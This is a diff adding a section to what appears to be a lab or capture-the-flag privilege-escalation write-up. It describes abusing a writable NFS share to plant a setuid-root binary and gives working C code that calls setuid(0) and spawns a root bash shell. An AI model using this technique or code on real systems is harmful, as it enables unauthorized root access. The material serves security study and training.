@@ -527,6 +527,27 @@ root
 #
 ```
 
-### Method - 3
+### Method 3 - setuid Binary
+
+- As we have access to the nfs share we are able to add the suid bit to any binary we want
+- below is the source code that will spawn a root shell
+``` c
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/types.h>
+
+int main() {
+	setuid(0);
+	system("/bin/bash");
+	return 0;
+}
+```
+
+- We can then compile the code and move it to /var/www/html so we can access it on the attacker machine
+- Finally we set the suid bit of the binary so it always runs as root
+
+
+
+
 
 
